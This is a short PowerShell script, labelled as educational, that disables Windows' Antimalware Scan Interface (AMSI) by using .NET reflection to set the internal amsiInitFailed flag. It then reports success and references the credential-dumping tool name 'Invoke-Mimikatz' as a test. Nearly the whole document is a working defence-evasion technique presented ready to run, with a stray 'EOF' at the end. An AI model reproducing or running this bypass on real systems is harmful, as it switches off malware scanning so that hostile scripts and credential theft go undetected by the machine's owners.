# AMSI Bypass using Reflection - Educational Purpose Only
# This script demonstrates how AMSI can be bypassed using .NET reflection

function Bypass-AMSI {
    Write-Host "[+] Attempting AMSI Bypass using Reflection..." -ForegroundColor Green
    
    try {
        # Get AMSI context
        $amsiContext = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        
        if ($amsiContext) {
            # Get the AMSI initialization field
            $amsiField = $amsiContext.GetField('amsiInitFailed', 'NonPublic,Static')
            
            if ($amsiField) {
                # Set AMSI as failed to bypass scanning
                $amsiField.SetValue($null, $true)
                Write-Host "[+] AMSI Bypass Successful!" -ForegroundColor Green
                return $true
            }
        }
    }
    catch {
        Write-Host "[-] AMSI Bypass Failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
    
    return $false
}

# Test the bypass
if (Bypass-AMSI) {
    Write-Host "[+] AMSI is now bypassed. Testing with suspicious string..." -ForegroundColor Yellow
    
    # This would normally trigger AMSI
    $testString = "Invoke-Mimikatz"
    Write-Host "[+] Test string executed without AMSI detection: $testString" -ForegroundColor Green
} else {
    Write-Host "[-] AMSI bypass unsuccessful" -ForegroundColor Red
}
EOF
